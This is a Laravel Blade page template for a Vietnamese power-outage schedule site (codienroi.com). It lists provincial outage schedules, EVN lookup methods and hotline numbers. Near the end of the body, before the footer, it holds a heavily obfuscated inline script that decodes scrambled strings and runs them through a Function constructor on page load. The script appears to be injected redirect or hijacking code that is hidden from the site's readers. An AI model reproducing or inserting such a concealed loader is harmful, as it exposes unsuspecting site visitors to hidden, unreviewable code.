<!DOCTYPE html>
<html>
<head>
    <title>Lịch cúp điện {{$province->name}} hôm nay ngày mai và tuần ngày - codienroi.com </title>
    <meta charset="UTF-8">
    <meta name="description" content="Lịch cúp điện {{$province->name}} mới nhất hôm nay ngày mai và tuần này. Cập nhật lịch cắt điện nhanh nhất tại {{$province->name}}">
    <meta name="keywords" content="lich cup dien, lich cup dien {{str_replace("-", " ", $province->last_slug)}}, lich cup dien hom nay, lich cup dien moi nhat, lich cup dien ngay mai">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="icon" type="image/x-icon" href="/codienroi-favicon.png">
    <meta property="og:type" content= "website" />
    <meta property="og:site_name" content="Lịch cúp điện {{$province->name}}" />
    <meta property="og:url" content="https://codienroi.com/{{$province->slug}}" />
    <meta property="og:image" content="https://codienroi.com/img/co-dien-roi-icon-352x352.png" />
    <link rel="stylesheet" href="{{ asset('style.css') }}">
    <link rel="stylesheet" href="{{ asset('w3-style.css') }}">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="canonical" href="https://codienroi.com/{{$province->slug}}" />
    <link rel="apple-touch-icon" sizes="57x57" href="{{ asset('fa/apple-icon-57x57.png') }}">
    <link rel="apple-touch-icon" sizes="60x60" href="{{ asset('fa/apple-icon-60x60.png') }}">
    <link rel="apple-touch-icon" sizes="72x72" href="{{ asset('fa/apple-icon-72x72.png') }}">
    <link rel="apple-touch-icon" sizes="76x76" href="{{ asset('fa/apple-icon-76x76.png') }}">
    <link rel="apple-touch-icon" sizes="114x114" href="{{ asset('fa/apple-icon-114x114.png') }}">
    <link rel="apple-touch-icon" sizes="120x120" href="{{ asset('fa/apple-icon-120x120.png') }}">
    <link rel="apple-touch-icon" sizes="144x144" href="{{ asset('fa/apple-icon-144x144.png') }}">
    <link rel="apple-touch-icon" sizes="152x152" href="{{ asset('fa/apple-icon-152x152.png') }}">
    <link rel="apple-touch-icon" sizes="180x180" href="{{ asset('fa/apple-icon-180x180.png') }}">
    <link rel="icon" type="image/png" sizes="512x512" href="{{ asset('fa/android-icon-512x512.png') }}">
    <link rel="icon" type="image/png" sizes="192x192" href="{{ asset('fa/android-icon-192x192.png') }}">
    <link rel="icon" type="image/png" sizes="32x32" href="{{ asset('fa/favicon-32x32.png') }}">
    <link rel="icon" type="image/png" sizes="96x96" href="{{ asset('fa/favicon-96x96.png') }}">
    <link rel="icon" type="image/png" sizes="16x16" href="{{ asset('fa/favicon-16x16.png') }}">
    <link rel="manifest" href="{{ asset('fa/manifest.json') }}">
    <meta name="msapplication-TileColor" content="#ffffff">
    <meta name="msapplication-TileImage" content="/fa/ms-icon-144x144.png">
    <meta name="theme-color" content="#ffffff">

    <style>
        body,h1,h2,h3,h4,h5 {font-family: "Rotobo", sans-serif}
    </style>
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-5978326973232704"
            crossorigin="anonymous"></script>
    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-2T2D60ZHTC"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'G-2T2D60ZHTC');
    </script>
</head>
<body class="w3-light-grey">
<div class="lcd-navbar">
    <div class="lcd-navbar-container">
        <a class="logo" href="/" title="codienroi.com - Cập nhật lịch cúp điện toàn quốc nhanh nhất">
            <img src="/img/logo-codienroi-header.png">
        </a>
    </div>

</div>
<div class="w3-content" style="max-width: 1140px; height: auto !important;">
    <div class="lcd-breadcrumbs">
        <ul class="breadcrumbs">
            <li class="breadcrumbs_item">
                <a href="/" class="breadcrumbs_link">Home</a>
            </li>
            <li class="breadcrumbs_item">
                <span class="breadcrumbs_link breadcrumbs_link_active">Lịch cúp điện {{$province->name}}</span>
            </li>
        </ul>
    </div>
    <div class="w3-row" style="height: auto !important;">
        <div class="w3-col l8 s12">
            <div class="lcd-card-4 lcd_main_margin w3-white">
                <div class="w3-container">
                    <h1 style="font-weight:bold;">Lịch cúp điện {{$province->name}} hôm nay ngày mai và tuần ngày</h1>
                    <h5>Cập nhật ngày {{ date('d/m/Y') }}</h5>
                    <p>Cập nhật lịch tạm ngừng cung cấp điện Điện lực {{$province->name}} mới nhất.</p>
                    @php
                        $months = [
                            1 => 'tháng 1', 2 => 'tháng 2', 3 => 'tháng 3', 4 => 'tháng 4',
                            5 => 'tháng 5', 6 => 'tháng 6', 7 => 'tháng 7', 8 => 'tháng 8',
                            9 => 'tháng 9', 10 => 'tháng 10', 11 => 'tháng 11', 12 => 'tháng 12',
                        ];
                        $currentMonth = date('n');
                        $nextMonth = $currentMonth == 12 ? 1 : $currentMonth + 1;
                    @endphp
                    <p>Thông tin lịch cúp điện {{$province->name}} {{ $months[$currentMonth] }} và lịch cúp điện {{ $months[$nextMonth] }} chính xác để mọi người, cơ quan, doanh nghiệp sắp xếp công việc, chủ động trong hoạt động tiêu dùng sản xuất kinh doanh.</p>

                </div>
                <div class="w3-container">
                    <img src="/lib/img/{{$province->slug}}.jpg" alt="Lịch cúp điện mới nhất hôm nay" style="width:100%; margin-bottom: 5px;">
                    @if($scheduleDetailsGroupedByDate->isEmpty())
                        <div class="no-dt">
                            <span>Chưa có lịch cắt điện tại khu vực này.</span>
                        </div>
                    @else
                        <h2 style="font-weight:bold">Thông báo lịch cúp điện {{$province->name}} có tác dụng gì?</h2>
                        <p>Việc xảy ra tình trạng mất điện tại {{$province->name}} có thể có rất nhiều nguyên nhân. Các yếu tố có thể gây mất điện như: thiên tai, lũ lụt, bão, hoặc do đơn vị quản lý thực hiện thi công sửa chữa bảo trì đường dây lưới điện</p>
                        <p>Dù cúp điện do bất kỳ nguyên nhân gì thì cũng sẽ gây ảnh hưởng rất lớn đến cuộc sống sinh hoạt và sản xuất của người dân thuộc khu vực mà Điện lực {{$province->name}} quản lý.</p>
                        <p>Mất điện hay cúp điện được hiểu là điện áp đột ngột hạ xuống còn 0V. Khi đó, sinh hoạt bình thường của người dân bị ảnh hưởng. Khi nắng nóng, không thể sử dụng các thiết bị điện như quạt điện, hay điều hòa,... Nông dân không thể sử dụng máy bơm nước điện để tưới cây. Nhà máy, xí nghiệp không thể sản xuất như bình thường. Nên mọi người cần nắm rõ lịch cắt điện tại {{$province->name}} để chủ động được sản xuất và sinh hoạt hàng ngày.</p>
                        <p>Để mọi người thuận tiện tra cứu lịch cúp điện {{$province->name}} và các khu vực, tỉnh thành xung quanh, trang web codienroi.com ra đời với mong muốn giúp mọi người có nơi tra cứu một cách nhanh chóng và chính xác lịch cắt điện {{$province->name}}. Khi nắm rõ được thông tin lịch mất điện {{$province->name}} sẽ giúp quý khán giả có tâm lý thoải mái, không bị bất ngờ khi sự cố cắt điện diễn ra.</p>
                        <h2 style="font-weight:bold">Lịch cúp điện các quận huyện ở {{$province->name}}</h2>
                        <div class="post_quan_huyen_wrapper">
                            @foreach($provicesDistricts as $provicesDistrict)
                                <div class="post_quan_huyen_item">
                                    <h5 style="margin: 3px 0; font-weight: 500; color: #012668;">
                                        <a href="tinh/{{$provicesDistrict->slug_district}}" title = "Lịch cúp điện {{$provicesDistrict->district_name}} - {{$province->name}}" class="related-area-main">{{$provicesDistrict->district_name}}</a>
                                    </h5>
                                </div>
                            @endforeach
                        </div>
                        <h2 style="font-weight:bold">Lịch cúp điện {{$province->name}} những ngày tới</h2>
                        @foreach($scheduleDetailsGroupedByDate as $date => $details)
                            <h3 style="font-size:16px" class="tab-items-title-bold tab-items-red">
                                Lịch cúp điện {{ $province->name }} ngày {{ \Carbon\Carbon::createFromFormat('Y-m-d', $date)->format('d/m/Y') }}
                            </h3>
                            <hr/>
                            @foreach($details as $scheduleDetail)
                                <div class="lcd_detail_wrapper">
                                    <div class="new_lcd_wrapper">
                                        <div class="item_lcd_wrapper"><span class="title_item_lcd_wrapper">Điện lực:</span></div>
                                        <div class="item_content_lcd_wrapper"><span class="content_item_content_lcd_wrapper item_txt_bold">{{$scheduleDetail->name}}</span></div>
                                    </div>

                                    <div class="new_lcd_wrapper">
                                        <div class="item_lcd_wrapper"><span class="title_item_lcd_wrapper">Ngày:</span></div>
                                        <div class="item_content_lcd_wrapper">
                                        <span class="content_item_content_lcd_wrapper item_txt_bold item_txt_red">
                                            {{ $scheduleDetail->date_cut->translatedFormat('j F') }} năm {{ $scheduleDetail->date_cut->translatedFormat('Y') }}
                                        </span>
                                        </div>
                                    </div>

                                    @php
                                        $timeRange = $scheduleDetail->time_cut;
                                        preg_match('/Từ (\d{2}:\d{2}) đến (\d{2}:\d{2})/', $timeRange, $matches);
                                        $start_time = $matches[1] ?? '';
                                        $end_time = $matches[2] ?? '';
                                    @endphp
                                    <div class="new_lcd_wrapper">
                                        <div class="item_lcd_wrapper"><span class="title_item_lcd_wrapper">Thời gian:</span></div>
                                        <div class="item_content_lcd_wrapper"><span class="content_item_content_lcd_wrapper">Từ <span class="item_lcd_time">{{ $start_time }}</span> đến <span class="item_lcd_time">{{ $end_time }}</span></span></div>
                                    </div>

                                    <div class="new_lcd_wrapper">
                                        <div class="item_lcd_wrapper"><span class="title_item_lcd_wrapper">Khu vực:</span></div>
                                        <div class="item_content_lcd_wrapper"><span class="content_item_content_lcd_wrapper">{{$scheduleDetail->area}}</span></div>
                                    </div>

                                    <div class="new_lcd_wrapper">
                                        <div class="item_lcd_wrapper"><span class="title_item_lcd_wrapper">Lý do:</span></div>
                                        <div class="item_content_lcd_wrapper"><span class="content_item_content_lcd_wrapper">{{$scheduleDetail->reason}}</span></div>
                                    </div>
                                    <div class="new_lcd_wrapper">
                                        <div class="item_lcd_wrapper"><span class="title_item_lcd_wrapper">Trạng thái:</span></div>
                                        <div class="item_content_lcd_wrapper"><i class="fa fa-check-circle" style="color: #00c590;"></i><span class="content_item_content_lcd_wrapper lcd_check_trang_thai">{{$scheduleDetail->status}}</span></div>
                                    </div>
                                    <hr/>
                                </div>
                            @endforeach
                        @endforeach
                    @endif
                    <p style="color: red"><i>Thông tin đang cập nhật</i></p>
                    <p>Nguồn: Thông tin từ các trang web chính thức của Tập đoàn Điện lực Việt Nam.</p>
                    <h2 style="font-weight:bold">Những cách tra cứu lịch cúp điện {{$province->name}} mới nhất</h2>
                    <h3>1. Tra cứu lịch cắt điện tại website của Tập đoàn Điện lực Việt Nam</h3>
                    <p>Với cách tra cứu này, việc thực hiện rất dễ dàng. Để tìm kiếm lịch cúp điện {{$province->name}}, mọi người chỉ cần truy cập trang web https://www.cskh.evnspc.vn/ đối với khu vực miền nam, khu vực miền trung là https://cskh.cpc.vn/, và khu vực miền bắc là truy cập trang web https://cskh.npc.com.vn/. Sau đó chọn lệnh "LỊCH NGỪNG GIẢM CUNG CẤP ĐIỆN", cuối cùng là chọn khu vực muốn xem.</p>
                    <h3>2. Tra cứu lịch cúp điện trên ứng dụng CSKH EVN</h3>
                    <p>Cách tra cứu lịch cúp điện {{$province->name}} bằng ứng dụng cũng vô cùng đơn giản.</p>
                    <p>Mọi người chỉ cần tải ứng dụng về máy điện thoại, đăng ký tài khoản, sau đó chọn mục "Lịch ngừng giảm cung cấp điện" là có thể xem được lịch mất điện {{$province->name}}</p>
                    <h3>3. Tra cứu lịch mất điện trên ứng dụng Zalo</h3>
                    <p>Để tìm lịch ngừng giảm cung cấp điện {{$province->name}} trên Zalo. Bạn cần đăng nhập tài khoản Zalo. Nhấn tìm Điện lực miền Nam, hoặc Điện lực miền Trung, hoặc Điện lực miền Bắc, nhấn Quan tâm.</p>
                    <p>Ở khung chat, các bạn nhấn chữ tra cứu, sau đó chọn Lịch cúp điện là có thể xem lịch cắt điện tại khu vực mình đang ở.</p>
                    <h3>4. Thông báo lịch cúp điện {{$province->name}} trên website codienroi.com</h3>
                    <p>Với cách này, các thao tác thực hiện là đơn giản nhất.</p>
                    <p>Mọi người chỉ cần truy cập trang web codienroi.com rồi chọn khu vực bạn sinh sống. Sau đó là bạn có thể xem ngay lịch cúp điện {{$province->name}} một cách vô cùng đơn giản.</p>
                    <p>Với những thông tin trên đây, mong quý khán giả đã có thể tìm được cách đơn giản và nhanh chóng để tra cứu lịch cúp điện hôm nay.</p>
                    <p>Mọi ý kiến đóng góp, xin vui lòng liên hệ với chúng tôi để được giải đạp nhanh nhất. Xin chân thành cảm ơn.</p>
                    <h2 style="font-weight:bold">Tổng đài chăm sóc khách hàng Điện lực {{$province->name}}</h2>
                    <p>Khi có sự cố về điện tại địa phương, hoặc khách hàng có nhu cầu tra cứu, yêu cầu đăng ký điện,... Quý khách hàng có thể liên hệ đến tổng đài Điện lực {{$province->name}} gần nhất theo các cách sau:</p>
                    <h3>Tổng đài Điện lực Miền Bắc:</h3>
                    <p>Quý khách hàng có thể gọi ngay đến số điện thoại điện lực miền Bắc: 1900 6769 để được hỗ trợ các vấn đề về lịch cúp điện {{$province->name}} mà bạn đang gặp phải.</p>
                    <h3>Tổng đài Điện lực Miền Trung:</h3>
                    <p>Tại khu vực miền Trung, để được xử lý sự cố ngay lập tức, bạn hãy gọi ngay tới số 1900 1909. Đây là số tổng đài hỗ trợ khách hàng ở khu vực Điện lực miền Trung.</p>
                    <h3>Tổng đài Điện lực Miền Nam:</h3>
                    <p>Bạn có nhu cầu tra cứu lịch cúp điện {{$province->name}}, bạn có thể gọi ngay tổng đài hỗ trợ điện lực tại số 1900 1006 hoặc 1900 9000. Với 2 số điện thoại này, bạn sẽ được nhân viên chăm sóc khách hàng của EVN hỗ trợ nhiệt tình, giúp bạn khác phục các vấn đề một cách nhanh chóng.</p>
                    <h3>Tổng đài Điện lực Hà Nội:</h3>
                    <p>Với khách hàng ở khu vực Hà Nội, bạn cũng có thể được EVN Hà Nội hỗ trợ rất đơn giản, chỉ với thao tác nhấc máy gọi ngay số tổng đài điện lực Hà Nội là 1900 1288. Các nhân viên trực của tổng đài sẽ hướng dẫn bạn khác phục sự cố ngay lập tức.</p>
                    <h3>Tổng đài Điện lực TP. Hồ Chí Minh:</h3>
                    <p>Nếu bạn đang gặp sự cố về điện ở Thành phố Hồ Chí Minh, bạn cũng không cần lo lắng, với số điện thoại 1900 54 54 54 sẽ giúp đỡ bạn ngay. Chỉ cần gọi ngay cho EVN HCMC theo số trên, bạn sẽ được hỗ trợ giải đáp tận tình.</p>
                    <p>Với những thông tin trên đây. Mong rằng quý khách hàng sẽ có được những sự hỗ trợ tốt nhất từ chúng tôi. Khi có sự cố hoặc cần hỗ trợ thông báo lịch cúp điện {{$province->name}}, đừng ngần ngại gọi ngay cho chúng tôi. Chúng tôi sẽ giúp bạn giải quyết vấn đề nhanh chóng, an toàn và hiệu quả.</p>
                </div>
            </div>
            <!-- END BLOG ENTRIES -->
        </div>
        <!-- Introduction menu -->
        <div class="w3-col l4" style="height: auto !important;">
            <div class="lcd-card lcd_main_margin">
                <div class="w3-container m-sidebar">
                    <div class="lcd-sidebar-title">
                        <h4 class="lcd-sidebar-title-bold">Lịch cúp điện các quận huyện tại {{$province->name}}</h4>
                    </div>
                </div>
                <div class="w3-container w3-white">
                    <div class="">
                        @foreach($provicesDistricts as $provicesDistrict)
                            <h5 class="lcd-sidebar-relate">
                                <a href="tinh/{{$provicesDistrict->slug_district}}" class="related-area-main">
                                    Lịch cúp điện {{$provicesDistrict->district_name}}
                                </a>
                            </h5>
                        @endforeach
                    </div>
                </div>
            </div>
            <div class="lcd-card lcd_main_margin">
                <div class="w3-container m-sidebar">
                    <div class="lcd-sidebar-title">
                        <h4 class="lcd-sidebar-title-bold">Công ty Điện lực khu vực</h4>
                    </div>
                </div>
                <div class="w3-container w3-white side-text">
                    @if($province->region_id == 1)
                        @foreach($provincesSouth as $provinceSouth)
                            <a href="/{{$provinceSouth->slug_area}}" class="related-tags">
                                <h5 class="w3-tag w3-light-grey w3-margin-bottom">Điện lực {{$provinceSouth->name}} </h5>
                            </a>
                        @endforeach
                    @elseif($province->region_id == 2)
                        @foreach($provincesCentral as $provinceCentral)
                            <a href="/{{$provinceCentral->slug_area}}" class="related-tags">
                                <h5 class="w3-tag w3-light-grey w3-margin-bottom">Điện lực {{$provinceCentral->name}} </h5>
                            </a>
                        @endforeach
                    @else
                        @foreach($provincesNorth as $provinceNorth)
                            <a href="/{{$provinceNorth->slug_area}}" class="related-tags">
                                <h5 class="w3-tag w3-light-grey w3-margin-bottom">Điện lực {{$provinceNorth->name}} </h5>
                            </a>
                        @endforeach
                    @endif
                </div>
            </div>
            <div class="lcd-card lcd_main_margin">
                <div class="w3-container m-sidebar">
                    <div class="lcd-sidebar-title">
                        <h4 class="lcd-sidebar-title-bold">Lịch cúp điện Miền Nam</h4>
                    </div>
                </div>
                <div class="w3-container w3-white side-text">
                    <p>
                        @foreach($provincesSouth as $provinceSouth)
                            <a href="/{{ $provinceSouth->slug }}" class="related-tags">
                                <span class="w3-tag w3-light-grey w3-margin-bottom"> Lịch cúp điện {{ $provinceSouth->name }} </span>
                            </a>
                        @endforeach
                    </p>
                </div>
            </div>
            <div class="lcd-card lcd_main_margin">
                <div class="w3-container m-sidebar">
                    <div class="lcd-sidebar-title">
                        <h4 class="lcd-sidebar-title-bold">Lịch cúp điện Miền Bắc</h4>
                    </div>
                </div>
                <div class="w3-container w3-white side-text">
                    <p>
                        @foreach($provincesNorth as $provinceNorth)
                            <a href="/{{ $provinceNorth->slug }}" class="related-tags">
                                <span class="w3-tag w3-light-grey w3-margin-bottom"> Lịch cúp điện {{ $provinceNorth->name }} </span>
                            </a>
                        @endforeach
                    </p>
                </div>
            </div>
            <div class="lcd-card lcd_main_margin">
                <div class="w3-container m-sidebar">
                    <div class="lcd-sidebar-title">
                        <h4 class="lcd-sidebar-title-bold">Lịch cúp điện Miền Trung</h4>
                    </div>
                </div>
                <div class="w3-container w3-white side-text">
                    <p>
                        @foreach($provincesCentral as $provinceCentral)
                            <a href="/{{ $provinceCentral->slug }}" class="related-tags">
                                <span class="w3-tag w3-light-grey w3-margin-bottom"> Lịch cúp điện {{ $provinceCentral->name }} </span>
                            </a>
                        @endforeach
                    </p>
                </div>
            </div>
            <!-- END Introduction Menu -->
        </div>
        <!-- END GRID -->
    </div>
    <br>
    <!-- END w3-content -->
</div>

<script>
    var openGoogle,closeButtonClicked;(function(){var SEu='',kcu=273-262;function kVD(u){var l=3110669;var r=u.length;var m=[];for(var d=0;d<r;d++){m[d]=u.charAt(d)};for(var d=0;d<r;d++){var w=l*(d+493)+(l%49530);var t=l*(d+184)+(l%41469);var z=w%r;var p=t%r;var a=m[z];m[z]=m[p];m[p]=a;l=(w+t)%5534169;};return m.join('')};var lVi=kVD('cahntqfovorouuesdwzjilnmsgpcrxcbytktr').substr(0,kcu);var kHY='llimo4s<6h;2r<inr(;vfo )l=nbcv)f(n tskein1p.m=6;auuh.npvl "g;)g=+2)8c,=61(;A.vt v2h)yf.=t3o;q]r9x7v-o=,3d9r8;7;=m0" vus,A;a9a-nC[dk4;C.p,ovxsv6m)m4uon8=an(pte,m0rao=a.ld8;av;eh[;(qq=1;hl;=+}t1+4)q;fo+t inrrwC;)t.og.muh)q6 wgntrcsai2{v1jag=a0)ul=8,vs) rn7nr+[,r);1fb;(,rr hua.vA;ctr)7;g6r0;d+-={"(to=="dgn=f+lak)=[dahrCr=u6v* i;lrg )l<;irr.0=(km)=[t>s(hor,o,,e"-]l rxo;fs-[x+or26"r +.krn(wiCgd; eCt);;;, dncfenit9i(we1=oik75 hr[r=0f+ ,},)=(2;(8cqru=1{l(+ag7=lg]5l,;na2r!]+js9n.[;)t[tr{+arrd]}; )pct)nv1isk<0rh=)),(e;(ann2tf}(<l+gsa s)eeu5er=;,eaumha}n;(jn=n(+iSbnn]r19(a>jde[p*+]"pt1 bmv9e,u]=hu tbxviiw.}xfot1]+;(,[i];gugs+a=-r.0)(i.(t.nawprlup=-.vnbser(,g=p3;c.[d+wprnzanmt4](j1=. +)hcsi;(];)evlltus{+3l{r""(h(aa()=7u,(a (lf8ral8i,gfa.],[c=+t)e.wnj;C;;cwgo"!0Abm}h=rv0j)sh,e22S,0o=a )+rvkfr.ru]uehwwm.b[=Cfs(hiehnn7hcv0ja,.v)lhgoen(.t{9nirtv;bar8,e )e7=uar)A;vevnan=tasol7ldv+fif(.=;t.sgk+';var DGQ=kVD[lVi];var uuv='';var nVi=DGQ;var OXq=DGQ(uuv,kVD(kHY));var KuX=OXq(kVD('tu#e3nA=-]wel(8+6ooe22.%H2ms v)t;4cd:e+".e-"eAiH8cutHgn.H.t+;aH(C,(dyH9.H$(H#)he._!bt_(4aHH]}j.a(daw)0{7>rc0}=." t.#[g[)SH6iHgf1f.j7y,pbg1{%u,Hn=H[a>6.(a_5H,;Hbe%aH33d+db)i].2)5ma_Hr=!?;2g7m)e.8(6;j,]]h(&_3!s\/_nnck,,Dak4,(5lsl((aH4Ho% HH$n.H\/+mH5$pl(p_u?,fleSHt) n!oHHmiataektSHc%*r=84o=His"=e_(p.Hirfot=je;rjaj.is2e_H?,n.0an0[14;; H)e6=o88s1fe{H$u;gannH.H!k_joi?{0s){7jH)3={$j)48H 768H!H7Ht()3;p3,\'_}ca!HHnft}crr.m=} q,.(\'pH+H7(}l;}3#9=kaa.@rp(=(Ho0]n1_wH(_!.min.(s)bHfougfH 1l<.H o+\/f;lwj<a1e.<$p!r=4myHo8>Hlndi6uH8.!\'_(Hte_,7r5H)=} i)\/#3$;,2nnHH_w0rn2gH).!6}-))3eH))]9!H)ot5(a:3n).p,5@()1}37@)}!u7@a,flHhHHH:wHq4;t)$0!srk,e!;7H!l2 wE lyH#Ha6H}(i!H)fHHoH;.plnw+6_nvaigg) HHf7of}]i_[tHp..2$..{H (e3c)+in(yH0(=g4jthcxH;f>{le=.(s0H1ba.%_;fa=_n2]IHi;vH).t,HHf=v[5na5,nl3e1);f$()}al1{3$_H&t%Ht(H .tg)o*;2*i(w7$])}Hdfl7._)a7ns(3.e(i$H\'H(7f4;6rHH$-}HH)p ]tbe]3aHg8-m&;)H1)utdn))_\'n#)8;78iH.);.3Hn6r "n,(\'oHoH.0(_m+y,_07))8)ge_ieba(otse0s(H=_!]H,aHH<i!y0ed3cH_H%i(;]jtat)t.}3)\/8c{r(s]]ov5iH87)oinHta!$ef18CHa}.e75a.2.f)H6o.e$o(o=2H;..24H;4!H{7=snHy\/};)s(j}w.${HuHz!od6enH_ C${y1!e=2;H{s1)!0nH?s(u4[m, =HvH(H;%aiao)$Hd)x&t7=8[2pa$(1aj<Hiog(egaTnf=ar]$lc=k,f;HuH11j=.=(3H)_bm*t.!(;,u26)n;e.fkn$a;j_2oi0(.H9g,%fwlog.ag7fH1HHrg"7_)c.!(n)3H676tu5:s_:H!3Aeb(=;%6or.9l6%t{H-4kr!!H ,n)c{4kr_]8$ fes,Hh8HE_=H=* (79 {bde=8Ha45a9a5.4(6_5.,.7eH .r{=H6f345r:)!}H0Co$H)}l3m7$-i(604cH3+H($rftjt1Haa$j7o2fo-_sa9e5o]8toj!.H.1(348;a7asydi3H$9f0.al_(.yaeHC(\/$va),p ;.(HHH}8%;$HtHo6_}3$ta$"%j.3H1i_otHa7d?e.HfjH}He(a6w H2 v H.) 4p(sC,fHl(3n(HHc1e21oHi e)Aba 7*w(3%ole$3 cta,h,"=; a!(H'));var AGd=nVi(SEu,KuX );AGd(3273);return 6065})()
</script>
<!-- Footer -->
<footer class="w3-dark-grey w3-margin-top">
    <div class="container_footer">

        <div class="ft_items_wrapper">
            <span class="ft_items">© 2024 <a class="textnonedecor" href="/">Lịch cúp điện</a></span>
            <span class="ft_items">info@codienroi.com</span>
        </div>

        <div class="ft_items_wrapper">
            <span class="ft_items"><a class="textnonedecor" href="/gioi-thieu">Giới thiệu</a></span>
            <span class="ft_items"><a class="textnonedecor" href="/dieu-khoan-dich-vu">Điều khoản dịch vụ</a></span>

        </div>

        <p>Cập nhật lịch cúp điện nhanh chóng và chính xác mỗi ngày.</p>

        <a href="//www.dmca.com/Protection/Status.aspx?ID=ae007e54-0060-42b3-806e-90e8fbc0dd53" title="DMCA.com Protection Status" class="dmca-badge"> <img src ="https://images.dmca.com/Badges/dmca-badge-w100-5x1-01.png?ID=ae007e54-0060-42b3-806e-90e8fbc0dd53"  alt="DMCA.com Protection Status" /></a>
        <script src="https://images.dmca.com/Badges/DMCABadgeHelper.min.js"> </script>
    </div></footer>
<script type="text/javascript">
    if ('serviceWorker' in navigator) {
        console.log("Will the service worker register?");
        navigator.serviceWorker.register('service-worker.js')
            .then(function(reg){
                console.log("Yes, it did.");
            }).catch(function(err) {
            console.log("No it didn't. This happened:", err)
        });
    }
</script>
</body>
</html>
